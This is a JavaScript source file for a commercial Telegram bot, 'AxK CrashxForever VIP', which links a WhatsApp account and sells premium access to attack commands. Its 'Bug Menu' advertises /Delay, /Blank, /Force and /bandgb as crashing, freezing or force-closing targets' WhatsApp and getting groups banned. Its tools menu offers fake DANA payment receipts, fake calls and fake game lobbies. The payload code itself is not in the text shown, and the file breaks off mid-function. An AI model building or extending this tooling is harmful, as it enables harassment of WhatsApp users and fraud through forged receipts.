//Base Rich By@aurelliaa_vx - MODIFIED: 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃
import { Telegraf, RichMessage, Markup, session } from '@icanseeuanywhere/telekaf';
import fs from "fs";
import path from "path";
import https from "https";
import moment from "moment-timezone";
import {
  makeWASocket,
  makeCacheableSignalKeyStore,
  makeInMemoryStore,
  useMultiFileAuthState,
  fetchLatestWaWebVersion,
  DisconnectReason,
  getContentType,
  jidDecode,
  generateWAMessage,
  generateWAMessageFromContent,
  fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import pino from "pino";
import chalk from "chalk";
import axios from "axios";
import readline from "readline";
import config from "./config.js";
const { BOT_TOKEN, OWNER_IDS } = config;
import crypto from "crypto";

const sessionPath = './session';
let bots = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function extractInviteCode(link) {
    if (typeof link !== "string") return null;

    const value = link.trim();

    // Ambil kode dari link WhatsApp
    const match = value.match(
        /chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i
    );

    if (match) {
        return match[1];
    }

    // Jika input langsung berupa invite code
    if (/^[A-Za-z0-9_-]+$/.test(value)) {
        return value;
    }

    return null;
}
// ============================================================
//  DATABASE JSON (NO MONGODB)
// ============================================================
const DB_PATH = path.join(process.cwd(), 'Database');
const PREMIUM_FILE = path.join(DB_PATH, 'prem.json');
const ADMIN_FILE = path.join(DB_PATH, 'edmin.json');
const PREMIUM_GROUPS_FILE = path.join(DB_PATH, 'premiumGroups.json');

if (!fs.existsSync(DB_PATH)) {
  fs.mkdirSync(DB_PATH, { recursive: true });
}

const loadJSON = (filePath) => {
  try {
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, JSON.stringify([]));
      return [];
    }
    const data = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error(chalk.red(`Gagal menyimpan file ${filePath}:`), err);
  }
};

let adminUsers = loadJSON(ADMIN_FILE);
let premiumUsers = loadJSON(PREMIUM_FILE);
let premiumGroups = loadJSON(PREMIUM_GROUPS_FILE);

function loadPremiumGroups() {
  return loadJSON(PREMIUM_GROUPS_FILE);
}

function savePremiumGroups(data) {
  saveJSON(PREMIUM_GROUPS_FILE, data);
}

function isGroupPremium(groupId) {
  const groups = loadPremiumGroups();
  return groups.some(item => item.startsWith(groupId.toString() + "|"));
}

function addGroupPremium(groupId, days) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();

  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (exists) {
    return { success: false, message: "Group sudah premium" };
  }

  const expiredDate = new Date();
  expiredDate.setDate(expiredDate.getDate() + days);
  const expiredTimestamp = expiredDate.getTime();

  premiumGroups.push(`${groupId}|${expiredTimestamp}`);
  savePremiumGroups(premiumGroups);

  return {
    success: true,
    message: `Group premium aktif selama ${days} hari`,
    expired: expiredDate.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' })
  };
}

function removeGroupPremium(groupId) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();

  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (!exists) return false;

  premiumGroups = premiumGroups.filter(item => !item.startsWith(`${groupId}|`));
  savePremiumGroups(premiumGroups);
  return true;
}

function checkAndCleanExpiredGroups() {
  const groups = loadPremiumGroups();
  let changed = false;

  for (const item of groups) {
    const [groupId, expiredTimestamp] = item.split("|");
    if (Date.now() > parseInt(expiredTimestamp)) {
      removeGroupPremium(groupId);
      changed = true;
    }
  }

  if (changed) {
    console.log(chalk.green("✅ Expired premium groups cleaned"));
  }
}

// ============================================================
//  FUNGSI CHECK
// ============================================================
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString();
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❌ Mohon Maaf Fitur Ini Khusus Owner");
  }
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(ADMIN_FILE, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(ADMIN_FILE, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(PREMIUM_FILE, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(PREMIUM_FILE, premiumUsers);
};

function isPremiumUser(userId) {
  return premiumUsers.includes(userId.toString());
}

function isAdminUser(userId) {
  return adminUsers.includes(userId.toString());
}

const checkPremiumOrGroupPremium = (ctx, next) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id.toString();

  if (premiumUsers.includes(userId)) {
    return next();
  }

  if (ctx.chat.type !== "private" && isGroupPremium(chatId)) {
    return next();
  }

  const msg = new HTML()
    .heading(2, "❌ AKSES DITOLAK")
    .paragraph("Akses hanya untuk:")
    .ul(
      "User Premium",
      "Group Premium"
    )
    .divider()
    .paragraph("Hubungi owner untuk upgrade!")
    .build();

  return ctx.sendRichMessage(msg);
};

// ====================
// VARIABEL GLOBAL
// ====================

let sock = null;
let authState;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let lastPairingMessage = null;

const usePairingCode = true;

const randomImages = [
  "https://files.catbox.moe/e00cir.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

// ============================================================
//  BOT
// ============================================================
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

// ============================================================
//  WHATSAPP SOCKET
// ============================================================
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  try {
    console.clear();

    console.log(chalk.bold.cyan(`
╔══════════════════════╗
║ 「 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 ACTIVATED 」║
╚══════════════════════╝
    `));

    const sessionPath = "./session";

    // Buat folder session jika belum ada
    if (!fs.existsSync(sessionPath)) {
      fs.mkdirSync(sessionPath, { recursive: true });
      console.log("📁 Folder session dibuat");
    }

    // Jangan buat creds.json kosong manual
    const { state, saveCreds } =
      await useMultiFileAuthState(sessionPath);

    // Simpan state agar bisa dipakai command /connect
    authState = state;

    const { version } =
      await fetchLatestBaileysVersion();

    const connectionOptions = {
      version,
      keepAliveIntervalMs: 30000,
      printQRInTerminal: !usePairingCode,
      logger: pino({ level: "fatal" }),
      auth: state,

      browser: [
        "Mac OS",
        "Safari",
        "10.15.7"
      ],

      getMessage: async () => ({
        conversation: "𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃"
      })
    };

    // Buat socket WhatsApp
    sock = makeWASocket(connectionOptions);

    // Simpan credentials
    sock.ev.on("creds.update", saveCreds);

    store.bind(sock.ev);

    sock.ev.on("messages.upsert", async (m) => {
      try {
        if (!m?.messages?.[0]) return;

        const msg = m.messages[0];
        const chatId = msg.key.remoteJid;

      } catch (error) {
        console.error("Messages error:", error);
      }
    });

    sock.ev.on("connection.update", async (update) => {
      const {
        connection,
        lastDisconnect
      } = update;

      if (connection === "connecting") {
        console.log("⏳ Menghubungkan ke WhatsApp...");
      }

      if (connection === "open") {

        isWhatsAppConnected = true;

        console.log(
          chalk.green("✅ WhatsApp berhasil terhubung!")
        );

        // Update pesan pairing jika ada
        if (lastPairingMessage) {

          const connectedMenu = `
<blockquote><pre>⬡╗─—⊱ ⌧ 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 ⌭ ⊰—─╗⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: <code>${lastPairingMessage.pairingCode}</code>
⌑ Status: Connected
`;

          try {
            await bot.telegram.editMessageCaption(
              lastPairingMessage.chatId,
              lastPairingMessage.messageId,
              undefined,
              connectedMenu,
              {
                parse_mode: "HTML"
              }
            );

          } catch (error) {
            console.error(
              "Gagal update status pairing:",
              error.message
            );
          }
        }
      }

      if (connection === "close") {

        isWhatsAppConnected = false;

        const statusCode =
          lastDisconnect?.error?.output?.statusCode;

        const shouldReconnect =
          statusCode !== DisconnectReason.loggedOut;

        console.log(
          chalk.red("❌ WhatsApp terputus")
        );

        if (shouldReconnect) {

          console.log(
            chalk.yellow("🔄 Mencoba reconnect...")
          );

          setTimeout(() => {
            startSesi();
          }, 3000);

        } else {

          console.log(
            chalk.red(
              "🚫 Session logout. Hapus session lalu lakukan pairing ulang."
            )
          );
        }
      }
    });

  } catch (error) {

    console.error(
      "❌ Error startSesi:",
      error
    );

    setTimeout(() => {
      startSesi();
    }, 5000);
  }
};
const { RichHTMLBuilder: HTML } = RichMessage;

const checkWhatsAppConnection = async (ctx, next) => {
  if (isWhatsAppConnected && sock?.user) {
    return next();
  }

  const msg = new HTML()
    .heading(1, HTML.customEmoji("5350759382223186548", "📡") + " Sender Offline")
    .divider()
    .blockQuote(HTML.bold("WhatsApp Sender is currently disconnected."))
    .paragraph(
      "Bot tidak dapat menjalankan fitur yang membutuhkan koneksi WhatsApp.\n\n" +
      "Silakan hubungkan Sender terlebih dahulu sebelum menggunakan command ini."
    )
    .divider()
    .table(
      [
        ["Status", "Value"],
        ["Connection", "Offline ❌"],
        ["Required", "WhatsApp Sender"],
        ["Action", "Connect Sender"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .taskList(
      { text: "Telegram Connected", checked: true },
      { text: "WhatsApp Sender Connected", checked: false }
    )
    .details(
      "📖 Information",
      "Pastikan perangkat WhatsApp telah login kembali. Setelah status berubah menjadi Connected, seluruh command akan kembali dapat digunakan."
    )
    .footer("© 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 " + HTML.customEmoji("5429528223438367408", "🔱"))
    .build();

  return await ctx.sendRichMessage(msg, {
    protect_content: true,
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Developer",
          url: "https://t.me/RannNewEra",
          style: "success",
          icon_custom_emoji_id: "5350280858441903578"
        }
      ]
    ]).reply_markup
  });
};

// ============================================================
//  MENU START
// ============================================================
const PHOTOS = [
  "https://files.catbox.moe/e00cir.jpg",
  "https://files.catbox.moe/jdm226.jpg",
  "https://files.catbox.moe/e00cir.jpg"
];

bot.command('start', async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "Terhubung" : "Tidak Terhubung";

  const isPrivate = ctx.chat.type === 'private';
  const DRAFT_ID = 1;

  if (isPrivate) {
    const steps = [
      "⚡ Initializing 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃...",
      "📡 Connecting Telegram...",
      "🛡️ Loading Module...",
      "📦 Loading Resources...",
      "🔱 Mengambil Data Fitur...",
      "✅ Done!"
    ];

    for (const step of steps) {
      await ctx.sendRichMessageDraft(
        DRAFT_ID,
        new HTML().thinking(HTML.italic(step)).build()
      );
      await new Promise((r) => setTimeout(r, 900));
    }
  }

  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, " 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃" + HTML.customEmoji("5316968838691043737", "🚀"))
    .paragraph(
      `Welcome to 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃, This Menu Only Premium User 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃` +
      HTML.customEmoji("5429528223438367408", "🔱")
    )
    .divider()
    .heading(2, HTML.customEmoji("5352590867947349905", "💋") + " Bot Information")
    .table(
      [
        ["Information", "Detail"],
        ["Username", `${Name}`],
        ["UserId", `${userId}`],
        ["Name Bot", "𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃"],
        ["Version", "7.0 Vip (PROJECT)"],
        ["Status", `${waStatus}`],
        ["Runtine", `${waktuRunPanel}`],
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "⚙️ Important Information",
      `
      Jika Ada Kendala Dengan Bug
      Atau Error Bisa Hubungi@aurelliaa_vx 
      Dan Saran Atau Apa Silahkan Di Hubungi. 
      `
    )
    .blockQuote(HTML.bold("「 ! 」Select Menu Below 「 ! 」"))
    .build();

  await ctx.sendRichMessage(msg, {
    protect_content: false,
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Bug Menu",
          callback_data: "holee",
          style: "primary",
          icon_custom_emoji_id: "5350759382223186548"
        }
      ],
      [
        {
          text: "Tools Menu",
          callback_data: "tools",
          style: "primary",
          icon_custom_emoji_id: "5242284369640441680"
        }
      ],
      [
        {
          text: "Owner Menu",
          callback_data: "p",
          style: "danger",
          icon_custom_emoji_id: "5350725709679584478"
        },
        {
          text: "Thanks To",
          callback_data: "tqto",
          style: "danger",
          icon_custom_emoji_id: "4904687665158292410"
        }
      ],
      [
        {
          text: "Developer Script",
          url: "https://t.me/athanasiarisolmayo",
          style: "success",
          icon_custom_emoji_id: "5350280858441903578"
        }
      ],
      [
        {
          text: "Channel Fluxi",
          url: "https://t.me/TeamFluxX30",
          style: "success",
          icon_custom_emoji_id: "5258513401784573443"
        }
      ]
    ]).reply_markup
  });
});

// ============================================================
//  MENU ACTION
// ============================================================
bot.action("p", async (ctx) => {
  await ctx.answerCbQuery();
  try { await ctx.deleteMessage(); } catch (e) {}

  const userId = ctx.from.id.toString();

  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("5231200819986047254", "📊") + " Informasi Setting Menu")
    .table(
      [
        ['Command', 'Example', 'Description'],
        ['/addadmin', `/addadmin ${userId}`, 'Tambah admin'],
        ['/deladmin', `/deladmin ${userId}`, 'Hapus admin'],
        ['/addprem', `/addprem ${userId}`, 'Tambah premium'],
        ['/delprem', `/delprem ${userId}`, 'Hapus premium'],
        ['/cekprem', '/cekprem', 'Cek status premium'],
        ['/connect', '/connect 628xxx', 'Connect WA'],
        ['/resetsession', '/resetsession', 'Reset session'],
        ['/status', '/status', 'Cek status bot'],
        ['/addgrouppremium', '/addgrouppremium 30', 'Tambah premium group'],
        ['/delgrouppremium', '/delgrouppremium', 'Hapus premium group'],
        ['/listgrouppremium', '/listgrouppremium', 'List semua premium group'],
        ['/cekpremiumgroup', '/cekpremiumgroup', 'Cek status premium group']
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(" 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 " + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("holee", async (ctx) => {
  await ctx.answerCbQuery();
  try { await ctx.deleteMessage(); } catch (e) {}

  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, HTML.customEmoji("5316968838691043737", "💀") + " BUG MENU")
    .divider()
    .heading(2, HTML.customEmoji("5316968838691043737", "🚀") + " Command Bug")
    .table(
      [
        ["Command", "Efek"],
        ["/Delay", "Delay Hard"],
        ["/Blank", "Crash X Freeze"],
        ["/Force", "Forceclose"],
        ["/bandgb", "group band"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, HTML.customEmoji("5253959125838090076", "✅") + " Information Bugs")
    .taskList(
      { text: "Target Auto C1", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: true },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("tools", async (ctx) => {
  await ctx.answerCbQuery();
  try { await ctx.deleteMessage(); } catch (e) {}

  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("5231200819986047254", "📊") + " Tools Menu")
    .table(
      [
        ["Command", "Description"],
        ["/sketch", "Buat sketsa"],
        ["/fakedana", "Fake DANA"],
        ["/igc", "iPhone Group"],
        ["/iqc", "iPhone Quote"],
        ["/iqcsticker", "iPhone Quote Sticker"],
        ["/music", "Quote Music"],
        ["/tanyaustadz", "Quote Ustadz"],
        ["/threads", "Quote Threads"],
        ["/winquote", "Quote Windows"],
        ["/lobbyff", "Fake Lobby FF"],
        ["/lobbyml", "Fake Lobby ML"],
        ["/storyig", "Story IG"],
        ["/berita", "Quote Berita"],
        ["/randompap", "Random PAP"],
        ["/fakecall", "Fake Call"],
        ["/idcard", "ID Card"],
        ["/spotifycard", "Spotify Card"],
        ["/ttqc", "Quote TikTok"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(" 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 " + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back to Menu", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("tqto", async (ctx) => {
  await ctx.answerCbQuery();
  try { await ctx.deleteMessage(); } catch (e) {}

  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("4915896438879159184", "🤝") + " Credits")
    .paragraph("Project ini tidak akan berjalan tanpa kontribusi luar biasa dari orang-orang hebat di bawah ini:")
    .divider()
    .heading(2, HTML.customEmoji("5316740582654112585", "💻") + " Developer Network")
    .table(
      [
        ["Name", "Role"],
        ["Paii", "Developer"],
        ["Athanasia", "Developer²"],
        ["Abay", "Friend"],
        ["my mom", "Support"],
        ["Ikwhan", "Friend"],
        ["Amoy", "Friend"],
        ["Bagas", "Friend"],
        ["Alvaro", "Friend"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "🤝 Special Thanks",
      "Terima kasih juga kepada seluruh buyer, beta tester, dan komunitas yang terus mendukung pengembangan script ini."
    )
    .divider()
    .footer(" 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 " + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back to Menu", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("back_to_start", async (ctx) => {
  await ctx.answerCbQuery();
  try { await ctx.deleteMessage(); } catch (e) {}

  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "Terhubung" : "Tidak Terhubung";

  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, " 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 " + HTML.customEmoji("5316968838691043737", "🚀"))
    .paragraph(
      `Welcome to 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃, This Menu Only Premium User 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃` +
      HTML.customEmoji("5429528223438367408", "🔱")
    )
    .divider()
    .heading(2, HTML.customEmoji("5352590867947349905", "💋") + " Bot Information")
    .table(
      [
        ["Information", "Detail"],
        ["Username", `${Name}`],
        ["UserId", `${userId}`],
        ["Name Bot", "𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 𝑉𝐼𝑃"],
        ["Version", "1.0 𝑉𝐼𝑃"],
        ["Status", `${waStatus}`],
        ["Runtime", `${waktuRunPanel}`]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "⚙️ Important Information",
      "Jika Ada Kendala Dengan Bug Atau Error Bisa Hubungi@aurelliaa_vx"
    )
    .blockQuote(HTML.bold("「 ! 」Select Menu Below 「 ! 」"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "🐛 Bug Menu", callback_data: "holee", style: "primary" }],
      [{ text: "🔧 Tools Menu", callback_data: "tools", style: "primary" }],
      [
        { text: "⚙️ Owner Menu", callback_data: "p", style: "danger" },
        { text: "🤝 Thanks To", callback_data: "tqto", style: "danger" }
      ],
      [{ text: "📢 Channel", url: "https://t.me/TeamFluxX30", style: "success" }]
    ]).reply_markup
  });
});

// ============================================================
//  GROUP PREMIUM COMMANDS
// ============================================================
bot.command('addgrouppremium', async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
    return ctx.reply("❌ Akses hanya untuk owner / admin");
  }

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Command ini hanya bisa digunakan di dalam group");
  }

  const args = ctx.message.text.split(" ");
  let days = 30;

  if (args.length >= 2) {
    days = parseInt(args[1]);
    if (isNaN(days) || days <= 0) {
      return ctx.reply("❌ Durasi harus angka positif!\nContoh: /addgrouppremium 30");
    }
  }

  const groupId = ctx.chat.id.toString();
  const groupName = ctx.chat.title || "Tidak ada nama";
  const adminName = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

  if (isGroupPremium(groupId)) {
    const msg = new HTML()
      .heading(2, "⚠️ GROUP SUDAH PREMIUM")
      .paragraph(
        HTML.bold("📛 Nama:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n\n` +
        "Group ini sudah terdaftar sebagai premium!"
      )
      .build();
    return await ctx.sendRichMessage(msg);
  }

  const result = addGroupPremium(groupId, days);

  if (result.success) {
    const msg = new HTML()
      .heading(2, "✅ GROUP PREMIUM BERHASIL DITAMBAHKAN!")
      .divider()
      .paragraph(
        HTML.bold("📛 Nama Group:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID Group:") + ` <code>${groupId}</code>\n` +
        HTML.bold("👤 Ditambahkan oleh:") + ` ${adminName}\n` +
        HTML.bold("📅 Durasi:") + ` ${days} hari\n` +
        HTML.bold("⏰ Expired:") + ` ${result.expired}`
      )
      .divider()
      .paragraph("✨ Group sekarang memiliki akses premium! ✨")
      .build();
    await ctx.sendRichMessage(msg);
  } else {
    const msg = new HTML()
      .heading(2, "❌ GAGAL TAMBAH PREMIUM")
      .paragraph(HTML.bold("📌 Error:") + ` ${result.message}`)
      .build();
    await ctx.sendRichMessage(msg);
  }
});

bot.command('delgrouppremium', async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
    return ctx.reply("❌ Akses hanya untuk owner / admin");
  }

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Command ini hanya bisa digunakan di dalam group");
  }

  const groupId = ctx.chat.id.toString();
  const groupName = ctx.chat.title || "Tidak ada nama";

  if (!isGroupPremium(groupId)) {
    const msg = new HTML()
      .heading(2, "⚠️ GROUP TIDAK PREMIUM")
      .paragraph(`Group *${groupName}* tidak terdaftar sebagai premium!`)
      .build();
    return await ctx.sendRichMessage(msg);
  }

  const success = removeGroupPremium(groupId);

  if (success) {
    const msg = new HTML()
      .heading(2, "✅ GROUP PREMIUM BERHASIL DIHAPUS!")
      .divider()
      .paragraph(
        HTML.bold("📛 Nama:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID:") + ` <code>${groupId}</code>`
      )
      .divider()
      .paragraph("Group tidak lagi memiliki akses premium.")
      .build();
    await ctx.sendRichMessage(msg);
  } else {
    ctx.reply("❌ Gagal menghapus premium!");
  }
});

bot.command('listgrouppremium', async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
    return ctx.reply("❌ Akses hanya untuk owner / admin");
  }

  checkAndCleanExpiredGroups();
  const premiumGroups = loadPremiumGroups();

  if (premiumGroups.length === 0) {
    const msg = new HTML()
      .heading(2, "📋 DAFTAR GROUP PREMIUM")
      .paragraph("Belum ada group yang terdaftar sebagai premium.")
      .build();
    return await ctx.sendRichMessage(msg);
  }

  let listText = "📋 *DAFTAR GROUP PREMIUM*\n\n";
  for (let i = 0; i < premiumGroups.length; i++) {
    const [groupId, expiredTimestamp] = premiumGroups[i].split("|");
    const expiredDate = new Date(parseInt(expiredTimestamp));
    const formattedDate = expiredDate.toLocaleDateString("id-ID", {
      day: "numeric",
      month: "long",
      year: "numeric"
    });
    listText += `${i + 1}. ID: \`${groupId}\`\n`;
    listText += `   Expired: ${formattedDate}\n\n`;
  }

  const msg = new HTML()
    .heading(2, "📋 DAFTAR GROUP PREMIUM")
    .pre(listText, 'text')
    .build();
  await ctx.sendRichMessage(msg);
});

bot.command('cekpremiumgroup', async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Command ini hanya bisa digunakan di dalam group");
  }

  const groupId = ctx.chat.id.toString();
  const groupName = ctx.chat.title || "Tidak ada nama";

  checkAndCleanExpiredGroups();
  const premiumGroups = loadPremiumGroups();
  const entry = premiumGroups.find(item => item.startsWith(`${groupId}|`));

  if (!entry) {
    const msg = new HTML()
      .heading(2, "⚠️ GROUP PREMIUM TIDAK AKTIF")
      .divider()
      .paragraph(
        HTML.bold("📛 Nama:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
        HTML.bold("📌 Status:") + " Tidak premium"
      )
      .divider()
      .paragraph("Hubungi owner untuk upgrade premium!")
      .build();
    return await ctx.sendRichMessage(msg);
  }

  const expiredTimestamp = parseInt(entry.split("|")[1]);
  const remaining = expiredTimestamp - Date.now();

  if (remaining <= 0) {
    removeGroupPremium(groupId);
    const msg = new HTML()
      .heading(2, "⚠️ GROUP PREMIUM EXPIRED")
      .divider()
      .paragraph(
        HTML.bold("📛 Nama:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
        HTML.bold("📌 Status:") + " Premium telah habis"
      )
      .divider()
      .paragraph("Hubungi owner untuk perpanjang!")
      .build();
    return await ctx.sendRichMessage(msg);
  }

  const days = Math.floor(remaining / (24 * 60 * 60 * 1000));
  const hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));

  const msg = new HTML()
    .heading(2, "✅ GROUP PREMIUM AKTIF")
    .divider()
    .paragraph(
      HTML.bold("📛 Nama:") + ` ${groupName}\n` +
      HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
      HTML.bold("⏰ Sisa waktu:") + ` ${days} hari ${hours} jam\n` +
      HTML.bold("📌 Status:") + " Aktif"
    )
    .build();
  await ctx.sendRichMessage(msg);
});

// ============================================================
//  TOOLS COMMANDS (SAMA)
// ============================================================
bot.command('sketch', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const imageUrl = textInput.trim();

  if (!imageUrl) {
